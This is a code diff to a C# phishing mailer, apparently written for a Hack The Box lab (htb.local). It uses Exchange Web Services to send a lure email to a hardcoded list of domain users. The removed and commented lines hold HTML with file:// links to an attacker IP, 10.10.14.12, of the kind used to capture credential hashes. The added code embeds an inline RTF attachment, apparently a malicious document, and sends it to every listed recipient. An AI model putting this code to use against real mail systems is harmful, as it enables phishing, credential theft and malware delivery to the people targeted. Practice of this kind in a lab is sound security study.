@@ -44,7 +44,7 @@ namespace HelloWorld
             // email.ToRecipients.Add("alex@htb.local");
             // email.ToRecipients.Add("Administrator@htb.local");    
             // Add email address from an array of recipients       
-            string[] Recipients = { "Administrator","alex","bob","charles","david","davis","donald","edward","frans","fred","gregg","james","jea_test_account","jeff","jenny","jhon","jim","joe","joseph","kalle","kevin","knut","lars","lee","marshall","michael","richard","rober","robin","ronald","steven","stig","sven","teresa","thomas","travis","william" };
+            string[] Recipients = { "Administrator","alex","bob","charles","david","davis","donald","edward","frans","fred","gregg","james","jea_test_account","jeff","jenny","jhon","jim","joe","joseph","kalle","kevin","knut","lars","lee","marshall","michael","richard","robert","robin","ronald","steven","stig","sven","teresa","thomas","travis","william" };
             foreach (string rcpt in Recipients)
             {
                 email.ToRecipients.Add(rcpt + "@htb.local");
@@ -53,7 +53,25 @@ namespace HelloWorld
             email.Subject = "Hello from sven";
             //   email.Body = new MessageBody("This is the first email I've sent by using the EWS Managed API");
             // email.Body = new MessageBody("<html><h1>Download to update</h1><img src=\"file://10.10.14.12/image.jpg\"><p><a href='file://10.10.14.12/download.jpg'>reel2</a></p></html>");
-            email.Body = new MessageBody("<html><h1>Download to update</h1><img src=\"testimg\"><p><a href='file://10.10.14.12/download.jpg'>reel2</a></p></html>");
+            // email.Body = new MessageBody("<html><h1>Download to update</h1><img src=\"testimg\"><p><a href='file://10.10.14.12/download.jpg'>reel2</a></p></html>");
+
+            string html = @"<html>
+                            <head>
+                            </head>
+                            <body>
+                                <img width=100 height=100 id=""1"" src=""cid:message.rtf"">
+                            </body>
+                            </html>";
+            email.Body = new MessageBody(BodyType.HTML, html);
+
+            // string file = @"D:\Pictures\Party.jpg";
+            // email.Attachments.AddFileAttachment("Party.jpg", file);
+            // email.Attachments[0].IsInline = true;
+            // email.Attachments[0].ContentId = "Party.jpg";
+            string file = @"D:\Pictures\message.rtf";
+            email.Attachments.AddFileAttachment("message.rtf", file);
+            email.Attachments[0].IsInline = true;
+            email.Attachments[0].ContentId = "message.rtf";            
 
             // email.Send();
             email.SendAndSaveCopy();
